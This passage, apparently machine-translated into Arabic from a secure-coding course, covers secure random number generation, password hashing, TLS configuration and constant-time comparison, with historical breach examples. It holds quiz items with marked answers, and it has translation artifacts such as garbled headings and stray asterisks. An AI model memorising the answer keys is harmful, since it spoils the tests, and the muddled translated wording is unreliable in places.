
مشكلة أمنية سيئة بشكل خاص في أنظمة الكمبيوتر هي *مولدات الأرقام العشوائية غير الآمنة*. ينتج مولد الأرقام العشوائية غير الآمن قيما تبدو جيدة ، ولكنها تدمر أمان النظام بأكمله. تم إرجاع العديد من حالات فشل أنظمة التشفير إلى توليد أرقام عشوائية سيئة ، ويرجع ذلك جزئيا إلى أنه قد يكون من الصعب اكتشاف المشكلة.

في كثير من الحالات ، يعد استخدام مولدات الأرقام العشوائية غير الآمنة خطأ غير مقصود ، ولكن في بعض الحالات تقوم المؤسسات بتخريب مولدات الأرقام العشوائية *عمدا*. على سبيل المثال ، في عام 2020 ، تم الكشف عن أن وكالة المخابرات المركزية الأمريكية ، بالتعاون مع استخبارات ألمانيا الغربية ، تمتلك شركة Crypto AG وباعت على نطاق واسع منتجات التشفير التي تم تخريبها عمدا ، في بعض الحالات على الأقل عن طريق العبث بكيفية توليد قيم "عشوائية". انظر [انقلاب القرن الاستخباراتي](https://www.washingtonpost.com/graphics/2020/world/national-security/cia-crypto-encryption-machines-espionage/) بقلم جريج ميلر لمزيد من المعلومات.

يعد إنشاء أرقام عشوائية غير آمنة مشكلة خطيرة بشكل خاص في برنامج جهاز إنترنت الأشياء (IoT). وجد أحد تقارير عام 2021 أن حوالي 35 مليار جهاز من أجهزة إنترنت الأشياء بها ثغرات أمنية كارثية بسبب توليد أرقام عشوائية غير آمنة للتشفير. ويرجع ذلك جزئيا إلى أن العديد من مطوري برامج إنترنت الأشياء يتصلون مباشرة بمولدات الأرقام العشوائية للأجهزة (لا ينبغي عليهم فعل ذلك) ، ولكن الأسوأ من ذلك ، أنهم تجاهلوا رموز إرجاع الأخطاء من تلك المولدات (وبالتأكيد لا ينبغي عليهم فعل ذلك). عادة ما يكون لمولدات الأرقام العشوائية للأجهزة معدلات توليد يمكن تجاوزها بسهولة ، بحيث يمكنها إنشاء أرقام عشوائية بسرعات محدودة فقط. إذا قرأ المستخدمون بسرعة كبيرة ، فمن المحتمل أن يقوم المولد بالإبلاغ عن الأخطاء. مجرد الانتباه إلى رمز الخطأ من الجهاز لا يكفي حقا.  تفشل الأجهزة في بعض الأحيان ، وإذا توقف البرنامج في هذه الحالة ، فقد يكون جهاز إنترنت الأشياء غير موثوق به للغاية للمنافسة. غالبا ما يكون نموذج التعليمات البرمجية للوصول إلى أجهزة مولد الأرقام العشوائية غير آمن (يوضح كيفية الحصول على البيانات ، ولكن ليس كيفية استخدامها بشكل صحيح). قد يكون استخدام الأجهزة بشكل صحيح مباشرة أمرا صعبا للغاية ، على سبيل المثال ، يشير رقم صفحة دليل مستخدم LPC 54628 1,106 (من 1,152) ، بطريقة معقدة ، إلى أنه بعد قراءة رقم عشوائي من أجهزته ، يجب عليك قراءة القيم ال 32 التالية والتخلص منها. يظهر البحث نفسه أيضا أن مولدات الأرقام العشوائية للأجهزة من المعالجات الشائعة المستخدمة في منتجات إنترنت الأشياء لا تولد بيانات عشوائية بالكامل. يمكن للمرء استخدام اختبار العشوائية للتحقق مما إذا كانت الأرقام التي تم إنشاؤها عشوائية بالفعل.

يجب ألا يصل مطورو البرامج لأجهزة إنترنت الأشياء إلى سجلات الأجهزة مباشرة, ولكن يجب عليهم بدلا من ذلك استدعاء مولدات CSPRNG المصممة جيدا والتي تستخدم مصادر الأجهزة بشكل صحيح (يفضل مصادر متعددة) كمدخلات في تجمع الإنتروبيا الداخلي الخاص بهم. في معظم الحالات ، يجب على مطوري إنترنت الأشياء استخدام نظام تشغيل إنترنت الأشياء الذي يتضمن تطبيق CSPRG الذي تم تصنيفه بشكل صحيح من مصادر أجهزة متعددة, والتحقق ببساطة لمعرفة ما إذا كان يبدو أنه مكتوب بعناية للأمان. عندما لا يكون ذلك عمليا ، استخدم مكتبة CSPRNG جيدة الصنع وتحليلها تتضمن برنامجا صحيحا لاستخراج قيم عشوائية من أجهزتك ؛ لا تنفذ عملاتك المشفرة إلا إذا كنت خبيرا في التشفير. يجب على مطوري برامج إنترنت الأشياء أيضا إجراء اختبارات إحصائية على آلية إنشاء الأرقام العشوائية الخاصة بهم للتأكد من أنها عشوائية, لأن هذه مشكلة شائعة بشكل خاص في أجهزة إنترنت الأشياء. لمزيد من التفاصيل ، راجع [أنت تقوم بعمل IoT RNG](https://labs.bishopfox.com/tech-blog/youre-doing-iot-rng) ([عرض تقديمي](https://www.youtube.com/watch?v=Zuqw0-jZh9Y)) بقلم دان بترو وألان سيسيل ، عرض تقديمي ل DEF CON لعام 2021.

باختصار: تأكد من استخدام مولد رقم عشوائي شبه عشوائي قوي وآمن بشكل صحيح (CSPRNG) ، مزود بقيم أجهزة متعددة ، في كل مرة تحتاج فيها إلى قيمة لا يمكن للخصم التنبؤ بها. يجب أن تبحث عن وظيفة تقول إنها مولد أرقام عشوائية "آمن" أو "مشفر". لا تستخدم مولد أرقام "عشوائي" عاديا ، مثل أي شيء موثق على أنه يستخدم مولد متطابق خطي (LCG) ، لهذه الأغراض.

>  وقت القصة: المفاتيح الضعيفة التي تم إنشاؤها بواسطة OpenSSL الخاص ب Debian / Ubuntu

> في عام 2006 ، أجرى دبيان لينكس تغييرا على نسخته من مكتبة تشفير OpenSSL المستخدمة على نطاق واسع لمحاولة إزالة تحذير. ومع ذلك ، تم إجراء التغيير من قبل شخص ليس على دراية جيدة بالتشفير وقام عن غير قصد بتخريب مولد الأرقام العشوائية ل OpenSSL للمفاتيح على دبيان. كانت هناك محاولة قصيرة للتواصل مع مطوري مكتبة OpenSSL المنبع ، ولكن لم تكن هناك محاولة لاقتراح التغيير مرة أخرى إلى مشروع OpenSSL حتى يتمكن مشروع OpenSSL من التحقق من أن التغيير غير ضار. هذا يعني أن جميع المفاتيح التي تم إنشاؤها عبر OpenSSL بواسطة دبيان ، وكذلك Ubuntu (التي تستند إلى دبيان) ، كانت غير آمنة حتى تم العثور على الثغرة الأمنية في عام 2008. وشمل ذلك مفاتيح OpenSSH التي تم إنشاؤها عن طريق استدعاء OpenSSL. أعطيت هذه الثغرة الأمنية المعرف [CVE-2008-0166](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0166). بعد سبع سنوات ، أفاد بن كوكس أن عددا كبيرا من المفاتيح الضعيفة التي تم إنشاؤها من هذا الخطأ لا تزال قيد الاستخدام وأن بعضها يتحكم في مستودعات GitHub المهمة. وشملت هذه مستودعات Spotify و Yandex ومكتبات التشفير ل Python ونواة Python. (بن كوكس ، " [تدقيق جودة مفتاح SSH لمستخدمي GitHub](https://blog.benjojo.co.uk/post/auditing-github-users-keys) "، 2015). يوضح هذا المثال مدى أهمية القيم العشوائية الآمنة بشكل مشفر.

إذا كنت بحاجة إلى رقم عشوائي مشفر في نطاق
(على سبيل المثال ، عدد صحيح من 0 إلى رقم N) ،
لا **** تستخدم ببساطة المعامل أو عوامل التشغيل المتبقية.
يعتقد العديد من المبرمجين بشكل غير صحيح ** أنه من الجيد استخدام ملف
معامل أو عوامل التشغيل المتبقية (على سبيل المثال ، أو `%` `mod` في العديد من اللغات)
لهذا الغرض.
ومع ذلك ، غالبا ما يتسبب هذا في أن تكون بعض الأرقام أكثر احتمالا من غيرها ،
مشكلة تسمى *التحيز المعياري*.
يمكن أن يؤدي تحيز Modulo في بعض الأحيان إلى استغلال النظام.
(يولان روميلر،
[*الدليل النهائي ل "تحيز مودولو وكيفية تجنبه"! *](https://research.kudelskisecurity.com/2020/07/28/the-definitive-guide-to-modulo-bias-and-how-to-avoid-it/))

إذا كنت بحاجة إلى رقم عشوائي مشفر في نطاق ، فلا تستخدم المعامل
أو عوامل التشغيل المتبقية مباشرة - بدلا من ذلك ، استخدم موجودا
الدالة التي توفر  أرقاما عشوائية مشفرة *غير متحيزة* في نطاق.
توفر معظم مكتبات CSPRNG هذه الوظيفة - فقط تحقق من أنها غير متحيزة.
إذا كان يجب عليك تنفيذ ذلك بنفسك ، فهناك طرق مختلفة مثل
كعينة رفض ،
[أرقام عشوائية شبه عديمة القسمة لكل خوارزمية دانيال لومير ](https://dotat.at/@/2020-10-29-nearly-divisionless-random-numbers.html)، أو
[أرقام عشوائية بلا أقسام لكل ستيف كانون وكيندال ويليتس](https://dotat.at/@/2022-04-20-really-divisionless.html).
ومع ذلك ، يجب عليك عادة استخدام وظيفة مكتبة CSPRNG
التي توفر هذه الوظيفة.

#### اختبار 3.4: مولد الأرقام العشوائية الزائفة الآمن بشكل مشفر (CSPRNG)

\>\>حدد العبارة (العبارات) الحقيقية:<<

[!x] في العديد من لغات البرمجة ، سيكون لمولد الأرقام العشوائية الزائفة الآمن بشكل مشفر "آمن" أو "تشفير" في اسمه.

[x] في العديد من لغات البرمجة ، عادة ما تكون الوظيفة / الطريقة التي تحمل اسم "عشوائي" ولكن لا يوجد مؤشر آخر رقما عشوائيا يمكن التنبؤ به ويجب عدم استخدامها للأمان.

[ ] من السهل معرفة ما إذا كان PRNG المشفر قد تم تخريبه.

### تخزين كلمات المرور

الحاجة الشائعة هي أنك تقوم بتنفيذ خدمة و / أو تطبيق خادم ، وتحتاج إلى مصادقة المستخدم و / أو إثبات أنه مخول بتقديم طلب. وهذا ما يسمى *المصادقة الواردة*. فيما يلي ثلاث طرق شائعة للقيام بذلك:

1. تفويض هذا القرار إلى خدمة أخرى. تحتاج إلى الوثوق بهذه الخدمة الأخرى ، وتحتاج إلى مواصفات لتوصيل ذلك. OAUTH و OpenID هما مواصفاتان شائعتان لتقديم الطلب إلى الخدمة الأخرى. بشكل عام ، يمكنك استدعاء روتين لتنفيذ ذلك ؛ تأكد من تطبيق إرشادات الأمان الخاصة به. يمكن أن يكون هذا مناسبا للمستخدمين ، ولكن تذكر أن هذا يكشف عن كل تسجيل دخول إلى تلك الخدمة الخارجية (مصدر قلق بشأن الخصوصية) ، وتأكد من أنه يمكنك الوثوق بهذه الخدمة.

2. مطالبة مقدم الطلب بالحصول على مفتاح خاص يثبت هويته. يدعم كل من SSH و HTTPS هذا. من المزايا الرائعة لهذا النهج أنه في نهاية الخادم ، يجب تسجيل مفتاح عام فقط ، لذلك في حين أن النزاهة مهمة ، فإن سرية المفاتيح ليست حرجة. ومع ذلك ، يتطلب هذا أن يقوم المستخدم بإعداد هذا المفتاح الخاص.

3. دعم تسجيل الدخول المستند إلى كلمة المرور (جزئيا على الأقل).

إذا قمت بتنفيذ الخيار 3 ، ودعم تسجيل الدخول المستند إلى كلمة المرور (جزئيا على الأقل) ، فلديك الكثير من الشركة. تحتوي كلمات المرور على العديد من المشكلات المعروفة ، لكنها مشكلات معروفة. إذا كنت ستستخدم كلمات المرور ، جزئيا على الأقل ، فأنت بحاجة إلى القيام بذلك بشكل صحيح.

**احذر** من تخزين كلمات المرور بطريقة غير آمنة. قاعدة البيانات المليئة بمعلومات كلمة المرور هي هدف مغري للمهاجمين. في الممارسة العملية ، تمكن العديد من المهاجمين من الحصول على قواعد بيانات للمعلومات المتعلقة بكلمة المرور (على سبيل المثال ، عن طريق اقتحام الخدمة أو الحصول على نسخة احتياطية). *يجب* تصميم نظام آمن  بحيث لا يمكن للمهاجمين استغلال قواعد بيانات كلمات المرور من جانب الخادم بسهولة ، حتى عندما يتمكن المهاجمون من استرداد نسخة. فيما يلي بعض الأساليب التي لا **** تعمل:

* تخزين كلمات المرور "بشكل واضح" (غير مشفر). من الواضح ، إذا حصل المهاجم على هذه البيانات ، فيمكن للمهاجم استخدام جميع كلمات المرور. **_لا تفعل هذا!_**

* تجزئة كلمات المرور (على سبيل المثال ، مع MD5 أو SHA-1 أو SHA-256). يمتلك المهاجمون أدوات يمكنها تخمين مليارات كلمات المرور ، وتجزئتها جميعا ، ومقارنتها بالقيم المجزأة ، لذلك لا يحمي هذا كلمات المرور. **_لا تفعل هذا!_**

* التجزئة المملحة لكل مستخدم. يجمع هذا كلمة المرور مع قيمة عشوائية لكل مستخدم تسمى "الملح" ، ثم يجزئ المجموعة. تكمن المشكلة في أن خوارزميات التجزئة الحديثة سريعة جدا بحيث لا يزال بإمكان المهاجمين تخمين مليارات كلمات المرور وغالبا ما يجدون كلمة مرور المستخدم. مرة أخرى ، **_لا تفعل هذا!_**

إذا كنت تستخدم كلمات مرور للمصادقة الواردة ، فمن أجل الأمان ، **_يجب_** عليك  استخدام نوع خاص من الخوارزميات لهذا الغرض يسمى  خوارزمية *تجزئة التشفير المملحة المتكررة لكل مستخدم*. يسمى مصطلح "مكرر" أيضا اشتقاق المفتاح. يتم استخدام ثلاث خوارزميات بشكل شائع كخوارزمية تجزئة تشفير مملحة متكررة لكل مستخدم:

* **Argon2id**<br>ما لم يكن لديك سبب قوي لاستخدام شيء آخر ، فهذه هي الخوارزمية التي يجب استخدامها اليوم. إنه قوي نسبيا ضد كل من الهجمات القائمة على البرامج والأجهزة.

* **Bcrypt**<br>هذه خوارزمية لائقة ضد الهجمات القائمة على البرامج. ليس من السهل الهجوم باستخدام الأجهزة مقارنة ب PBKDF2 (لأن bcrypt يتطلب المزيد من ذاكرة الوصول العشوائي) ، ولكنه أضعف ضد الهجمات المستندة إلى الأجهزة مقارنة ب Argon2id.

* **PBKDF2**<br>هذه خوارزمية لائقة ضد الهجمات المستندة إلى البرامج ، ولكنها الأكثر عرضة لهذه الخوارزميات المستخدمة على نطاق واسع للهجمات المستندة إلى الأجهزة من الدوائر المتخصصة أو وحدات معالجة الرسومات. هذا لأنه يمكن تنفيذه بدائرة صغيرة وذاكرة وصول عشوائي صغيرة. قد لا تحتاج إلى استبداله (اعتمادا على أنواع المهاجمين التي تهمك) ، ولكن ربما يكون من الأفضل تجنب ذلك للأنظمة الجديدة اليوم.

خوارزمية أخرى قيد الاستخدام هي scrypt. يجب أن يكون هذا أيضا قويا ضد هجمات الأجهزة ، لكنه لم يحصل على الكثير من المراجعة مقارنة ب Argon2id ، لذلك يوصى باستخدام Argon2id بشكل أكثر شيوعا. ومع ذلك ، في وقت كتابة هذا التقرير ، لم يكن لديها مشاكل خطيرة معروفة.

يجب أن تسمح للمستخدمين بطلب استخدام المصادقة الثنائية (2FA) ، إما مباشرة أو عن طريق التفويض إلى خدمة تفعل ذلك.

أيضا ، احذر من تنفيذ هذه الخوارزميات فقط من جانب العميل. لا بأس من تنفيذها على جانب العميل (لأن ذلك يمنع الخادم من اكتشاف كلمة المرور التي يدخلها المستخدم) ، طالما يتم تنفيذها *أيضا* على الخادم. الخطر هو القيام بها *فقط* على العميل ؛ إذا حدث ذلك ، فإن ما يتم تخزينه في الخادم لا يختلف عن تخزين كلمات المرور بشكل واضح. بمجرد حصول المهاجمين على قاعدة بيانات كلمات المرور ، يمكنهم ببساطة إنشاء أو تعديل عميلهم لتسجيل الدخول إلى حساب أي شخص.

>  وقت القصة: خرق بيانات آشلي ماديسون
> آشلي ماديسون هي خدمة مواعدة تجارية كندية عبر الإنترنت تأسست في عام 2002 وتم تسويقها على أنها تمكن من الغش على الشركاء الرومانسيين. في عام 2015 سرق المهاجمون بيانات عملائها. تم الكشف عن العديد من القضايا في تلك المرحلة. سنركز على واحد هنا. استخدمت آشلي ماديسون  روتين **bcrypt** بشكل صحيح  لتخزين كلمات مرور المستخدم. لسوء الحظ ، في كثير من الحالات قاموا *أيضا* بتخزين كلمات المرور المشفرة باستخدام ** خوارزمية تجزئة MD5** ، وهي ليست خوارزمية مناسبة لتخزين كلمات المرور (كما هو مذكور أعلاه). استخدم المهاجمون تجزئات كلمة مرور MD5 غير المحمية هذه لفك تشفير أكثر من 11 مليون كلمة مرور لهذه الحسابات في 10 أيام فقط ، مما مكنهم من تسجيل الدخول إلى تلك الحسابات ("[بمجرد رؤيتها على أنها مضادة للرصاص ، 11 مليون + كلمات مرور Ashley Madison متصدعة بالفعل" بواسطة Dan Goodin ، 2015](https://arstechnica.com/information-technology/2015/09/once-seen-as-bulletproof-11-million-ashley-madison-passwords-already-cracked/)).

#### اختبار 3.5: تخزين كلمات المرور

\>\>حدد العبارة (العبارات) الحقيقية:<<

[!] يمكنك التخلص من جميع مخاوف أمان المصادقة والخصوصية عن طريق تفويض المصادقة إلى خدمة أخرى. {{ محدد: ليس كذلك. لسبب واحد ، هل يمكنك الوثوق بهذه الخدمة الأخرى؟ ستعرف تلك الخدمة الأخرى من قام بالمصادقة ومتى ؛ هل هذا مقبول؟ في كثير من الحالات ، يكون التفويض قرارا جيدا ، لكن عليك التفكير في التداعيات. }}

[ ] تتمثل إحدى الطرق الآمنة للخادم لتخزين كلمات المرور للمصادقة الواردة في تجزئة كلمة المرور باستخدام SHA-1. {{ محدد: بالتأكيد لا ، هذا  نهج *غير آمن*. يجب عليك استخدام خوارزمية مصممة خصيصا لهذا الغرض ، مثل Argon2id. }}

[ ] PBKDF2 أكثر أمانا من Argon2id. {{ محدد: لا ، هذه هي الطريقة الخاطئة. يتمتع Argon2id بمقاومة أقوى بكثير للهجمات المستندة إلى الأجهزة من PBKDF2. }}

[x] Argon2id و bcrypt و PBKDF2 كلها خوارزميات تجزئة تشفير مملحة شائعة لكل مستخدم ؛ من بين هؤلاء الثلاثة ، تفضل Argon2id ما لم يكن لديك سبب للقيام بخلاف ذلك.

### أمان طبقة النقل (TLS)

أمان طبقة النقل (TLS) هو بروتوكول تشفير مستخدم على نطاق واسع لتوفير الأمان عبر شبكة بين طرفين. يوفر الخصوصية والنزاهة بين تلك الأطراف. تم إصدار TLS الإصدار 1.3 في عام 2018. تم تسمية إصدار أقدم وغير آمن من هذا البروتوكول باسم طبقة مآخذ التوصيل الآمنة (SSL) ، وأحيانا يتم استخدام المصطلحات بالتبادل. عندما تستخدم **https://** في  متصفح ويب أو خادم اليوم ، فأنت تستخدم TLS عادة (في حالات نادرة ، قد تستخدم سابقتها غير الآمنة ، SSL). يستخدم TLS أيضا في تطبيقات أخرى ، على سبيل المثال ، لحماية تبادل البريد الإلكتروني بين وكلاء نقل البريد المختلفين (MTAs).

#### التحقق من صحة الشهادة

لاستخدام TLS بشكل صحيح ، يحتاج جانب الخادم على الأقل إلى شهادة (حتى يتمكن من إثبات للعملاء المحتملين أنه النظام الذي يدعي أنه هو). يمكنك إنشاء شهادة بنفسك وتثبيت مفتاحها العام على كل عميل (على سبيل المثال ، متصفح الويب) الذي سيتصل بهذا الخادم. هذا جيد للاختبار ، ولكن في معظم المواقف الأخرى ، يكون الأمر معقدا للغاية. في معظم الحالات (بخلاف الاختبار) يجب أن تحصل على شهادة تم تعيينها بواسطة مرجع مصدق. يمكنك الحصول على شهادات مجانية من [Let's Encrypt](https://letsencrypt.org/). إذا كانت متطلبات Let's Encrypt لا تناسب احتياجاتك ، فقد تكون المراجع المصدقة الأخرى مفيدة لك.

عندما يتصل العملاء بخادم باستخدام TLS، يحتاج العميل عادة إلى التحقق من صحة الشهادة. لقد عملت متصفحات الويب منذ فترة طويلة على ذلك. تأتي متصفحات الويب مع مجموعة قابلة للتكوين من المفاتيح العامة للمرجع المصدق (مباشرة أو عبر نظام التشغيل) وتتحقق تلقائيا من كل اتصال TLS جديد.

*احذر*: إذا كنت تستخدم عميلك الخاص ، فبدلا من استخدام متصفح ويب ، تحقق جيدا من أنك تستخدم واجهة برمجة تطبيقات مكتبة TLS *بشكل صحيح*. لا تتحقق العديد من واجهات برمجة تطبيقات مكتبة ** TLS بشكل  كامل من شهادة TLS للخادم تلقائيا. على سبيل المثال، قد تسمح بالاتصال بخادم في حالة عدم وجود شهادة خادم، أو قد تسمح بأي شهادة (بدلا من شهادة للموقع الذي تحاول الاتصال به)، أو تسمح بشهادات منتهية الصلاحية. هذا خطأ شائع للغاية ([*أخطر رمز في العالم: التحقق من صحة شهادات SSL في البرامج غير المستعرضة ، *](https://www.cs.utexas.edu/~shmat/shmat_ccs12.pdf)بقلم مارتن جورجييف ، سوبود إيينجار ، سومان جانا ، ريشيتا أنوبهاي ، دان بونه ، وفيتالي شماتيكوف ، 2012). إذا كانت هذه هي الحالة ، فربما تستخدم واجهة برمجة تطبيقات TLS منخفضة المستوى بدلا من واجهة برمجة التطبيقات التي يجب أن تستخدمها.

 يعد التحقق من صحة الشهادة بشكل غير صحيح سببا شائعا للثغرات الأمنية لدرجة أنه 2021 CWE Top 25 # 26 و 2021 CWE Top 25 # 26 و 2019 CWE Top 25 # 25. تم تحديده على أنه [CWE-295 ](https://cwe.mitre.org/data/definitions/295.html)، *التحقق من صحة الشهادة غير الصحيحة*.

#### سيفيرسويتس

يجمع TLS ، كبروتوكول ، بين العديد من القطع التي ناقشناها. في بداية الاتصال ، يجب على الجانبين التفاوض لتحديد مجموعة الخوارزميات (بما في ذلك أطوال المفاتيح) التي سيتم استخدامها لاتصالها. تسمى هذه المجموعة من الخوارزميات التشفير**. هذا يعني أنه من أجل الأمان ، من المهم أن يكون لديك تكوينات افتراضية جيدة وأن يتم تكوين البرنامج بشكل صحيح عند نشره.

إذا كنت تقوم بتكوين موقع HTTPS ، فإن مكانا رائعا للحصول على الإعدادات الموصى بها حاليا هو موقع [](https://wiki.mozilla.org/Security/Server_Side_TLS)TLS للأمان / الخادم[* من Mozilla*](https://wiki.mozilla.org/Security/Server_Side_TLS)[](https://wiki.mozilla.org/Security/Server_Side_TLS). القرار الرئيسي الذي يجب عليك اتخاذه هو ما إذا كنت تريد التكوين الحديث أو المتوسط أو القديم:

* حديث: الأكثر أمانا ، ولكن قد لا يتمكن عدد غير تافه من العملاء من الاتصال به.

* متوسط: إعداد حل وسط يسمح للعملاء الأكبر سنا بالاتصال مع توفير أمان جيد بشكل معقول.

* قديم: إعداد يوفر أفضل أمان ممكن يدعم العملاء والمكتبات القديمة. أمنها أضعف بكثير من المتوسطة.

في وقت كتابة هذا التقرير  ، يوصى *بالإعداد الوسيط* في معظم الحالات ، ولكن تحقق من موقع الويب هذا للحصول على التحديثات.

ستلاحظ أن أي تكوين يحتوي على قائمة بمجموعات تشفير TLS بترتيب الأفضلية. على سبيل المثال ، `TLS_AES_128_GCM_SHA256` يعني أن TLS هو استخدام معيار التشفير المتقدم (AES) مع مفتاح 128 بت في وضع Galois / Counter (GCM) جنبا إلى جنب مع خوارزمية التجزئة الآمنة مع 256 بت (SHA-256).

بمجرد نشر نظامك ، يجب عليك اختباره. إذا كان الموقع مرئيا للجمهور ، فمن الجيد استخدام اختبار Qualys المجاني المسمى [اختبار خادم SSL](https://www.ssllabs.com/ssltest/). يطلق عليه اختبار خادم SSL لأن هذا هو الاسم القديم ل TLS ، ولكن لا تنخدع ، فهو يعمل بشكل جيد مع TLS (وسوف يشتكي إذا سمحت ببروتوكولات SSL الضعيفة).

#### اختبار 3.6: أمان طبقة النقل (TLS)

\>\>حدد العبارة (العبارات) الحقيقية:<<

[!] إذا كنت تستدعي مكتبة TLS ، فمن المعقول افتراض أنها تتحقق بشكل كامل من شهادة TLS الخاصة بالخادم تلقائيا. {{ محدد: ليس كذلك. لا تتحقق العديد من المكتبات ** بشكل كامل ، على سبيل المثال ، قد لا تتحقق من أن الشهادة مناسبة لنظام معين. البعض يفعل ذلك ، ولكن عند استخدام مكتبة TLS لم تستخدمها من قبل ، من المهم التحقق مما تتحقق منه. }}

[x] تستخدم متصفحات الويب TLS أو SSL عند الاتصال بموقع خارجي بعنوان URL "**https:**".

[x] عندما تتصل متصفحات الويب بخادم باستخدام TLS ، فإنها تستخدم مجموعة قابلة للتكوين من المفاتيح العامة للمرجع المصدق (إما مضمنة مع المستعرض أو يتم توفيرها عبر نظام التشغيل).

[x] يمكن العثور على إعدادات خادم HTTPS الموصى بها في موقع Mozilla "الأمان / TLS من جانب الخادم".

### مواضيع أخرى في التشفير

#### الحصول على نصائح التشفير

في هذه الدورة ، حاولنا إعطاء بعض الأساسيات والمعلومات الكافية لتطبيقها في ظروف مختلفة. ربما الأهم من ذلك ، مع ذلك ، هي النصائح الأساسية: لا تنشئ خوارزميات أو بروتوكولات التشفير الخاصة بك ، ولا تنشئ تطبيقاتك الخاصة. بدلا من ذلك ، أعد استخدام الخوارزميات والبروتوكولات والتطبيقات التي تحظى باحترام كبير. عند تكوين التشفير ، ابحث عن النصائح الحالية التي تحظى باحترام كبير. تتضمن الأمثلة على هذه المصادر [موقع TLS للأمان / الخادم](https://wiki.mozilla.org/Security/Server_Side_TLS) من Mozilla ، و NIST (خاصة توصية NIST [*لإدارة المفاتيح: الجزء 1 - عام*](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf)) ، وتشفير [*الجيل التالي من CISCO*](https://tools.cisco.com/security/center/resources/next_generation_cryptography). لن يتفق مصممو التشفير دائما على ما هو "الأفضل" (كما هو الحال مع أي مجال آخر) ، لكن الخبراء سيكونون قادرين على الإشارة إلى ما هو مكسور بوضوح وما هو متفق عليه على نطاق واسع ليكون أكثر أمانا.

#### خوارزميات الوقت الثابت

هناك موضوع مهم لم نذكره بعد: خوارزميات الوقت الثابت ، وخاصة مقارنات الوقت الثابت. تستغرق العديد من الخوارزميات وقتا متغيرا اعتمادا على بياناتها. على سبيل المثال ، إذا كنت تريد تحديد ما إذا كانت صفيفتان متساويتان ، فعادة ما تتوقف هذه المقارنة عند أول قيمة غير متساوية.

يجب على أولئك الذين يطورون مكتبات التشفير تنفيذ خوارزمياتهم بحيث لا يختلف الوقت الذي يستغرقونه بناء على بيانات الإدخال الخاصة بهم (هذا غير تافه ، على الرغم من أنه ممكن ، مع AES). لا يتم تعليم معظم المطورين أبدا كيفية القيام بذلك ، لذلك يعد هذا أحد الأسباب العديدة التي تجعلك لا تكتب مكتبة التشفير الخاصة بك. ومع ذلك ، هناك اختلاف يمكن أن يحدث غالبا خارج هذه المكتبات: في بعض الأحيان يتعين عليك التعامل مع مقارنات المصفوفات بشكل خاص.

تحاول عمليات المقارنة العادية (مثل **is-equal**) تقليل وقت التنفيذ ، وقد يؤدي ذلك أحيانا إلى تسريب معلومات التوقيت حول القيم إلى المهاجمين. إذا تمكن أحد المهاجمين من إرسال البيانات بشكل متكرر ولاحظ أن مقارنة قيمة تبدأ ب "0" تستغرق وقتا أطول من تلك التي لا تفعل ذلك ، فيجب أن تكون القيمة الأولى التي تتم مقارنتها بها هي "0". يمكن للمهاجم بعد ذلك تخمين الرقم الثاني بشكل متكرر ، ثم الثالث ، وهكذا. يعتقد العديد من المطورين بشكل غير صحيح أنه لا يمكن للمهاجمين استغلال اختلافات التوقيت عبر الشبكة. هذا اعتقاد خاطئ يحب المهاجمون استغلاله. تبين أن الإحصاءات الحديثة قوية بشكل ملحوظ لإزالة فروق الكمون. يمكن للمهاجمين حقا ** استغلال زمن الانتقال هذا.

*مقارنات الوقت الثابت* هي مقارنات (عادة مساواة) تستغرق نفس الوقت بغض النظر عن البيانات المقدمة لهم. هذه ليست هي نفسها عمليات O (1) في علوم الكمبيوتر. أمثلة على وظائف مقارنة الوقت الثابت هذه:

* العقدة.js: **crypto.timingSafeEqual**

* روبي أون ريلز: **أكتيف أسيميونيتيبشن secure_compare** و **fixed_length_secure_compare**

* Java: **MessageDigest.equal** (على افتراض أنك لا تستخدم إصدارا قديما من Java)

عندما تقارن القيم السرية أو قيم التشفير (مثل مفاتيح الجلسة)، استخدم *مقارنة الوقت الثابت* بدلا من المقارنة العادية ما لم يتمكن المهاجم من استغلال توقيت المقارنة العادي. لا تحتاج إلى القيام بذلك باستخدام تجزئة مملحة مكررة محسوبة في بيئة موثوقة (مثل الخادم الخاص بك) ، لأن الأمر سيستغرق الكثير من الوقت لإنشاء القيم المطابقة. تحتاج ** إلى القيام بذلك إذا كنت تقارن مفاتيح الجلسة مباشرة بقيمة مخزنة ، حيث يمكن للمهاجمين ** أحيانا تكرار ذلك لمعرفة كل رقم في مفتاح الجلسة.

#### تقليل الوقت / البيانات التي تم فك تشفيرها

تذكر أنه في أقل امتياز ، نريد تقليل الوقت الذي يكون فيه الامتياز نشطا. في التشفير ، غالبا ما تريد تقليل الوقت الذي يتوفر فيه مفتاح خاص أو كلمة مرور ، أو على الأقل تقليل الوقت الذي تتوفر فيه البيانات التي تم فك تشفيرها. قد يكون هذا أصعب مما تعتقد. على مستوى نظام التشغيل ، يمكنك على الأرجح قفله في الذاكرة باستخدام **mlock() ** أو **VirtualLock() **؛ سيؤدي ذلك على الأقل إلى منع نسخ البيانات إلى التخزين. من الناحية المثالية ، يمكنك محوها من الذاكرة بعد الاستخدام ، على الرغم من أن ذلك غالبا ما يكون صعبا بشكل مدهش. قد يقوم المترجمون بتحويل التعليمات البرمجية للكتابة فوق التعليمات البرمجية إلى no-op ، لأنهم يكتشفون أنه لا يوجد شيء يقرأ القيم التي تم استبدالها. غالبا ما تقوم اللغات التي تحتوي على مجموعة بيانات مهملة مضمنة بعمل نسخ إضافية بهدوء و / أو لا توفر آلية للمحو. ومع ذلك ، فإن بعض اللغات أو البنية التحتية تجعل هذا الأمر سهلا. على سبيل المثال ، يمكن لأولئك الذين يستخدمون .NET framework (على سبيل المثال ، C #) استخدام SecureString.

#### الحوسبة الكمومية

أحد المجهولين المستقبليين الكبار في التشفير هو التأثير المحتمل لأجهزة الكمبيوتر الكمومية للأغراض العامة. في وقت كتابة هذا التقرير  ، كان هناك ما يسمى بأجهزة الكمبيوتر *الكمومية للأغراض العامة* ، لكنها ليست قوية بما يكفي لتهديد خوارزميات التشفير الحالية. من غير المعروف ما إذا كان يمكن بناء مثل هذه الكوادر الكمومية الأكثر قوة للأغراض العامة ، وإذا كان الأمر كذلك ، فمتى سيحدث ذلك. إذا تم بناء أجهزة كمبيوتر كمومية قوية للأغراض العامة ، فلديها القدرة على كسر جميع خوارزميات المفتاح العام الشائعة في عام 2020 باستخدام خوارزمية تسمى *خوارزمية شور.* ونتيجة لذلك، يعمل الباحثون على تطوير خوارزميات جديدة للمفتاح العام تقاوم الهجمات من أجهزة الكمبيوتر الكمومية هذه، وهو مجال يسمى *التشفير ما بعد الكمومي*. في وقت كتابة هذا التقرير 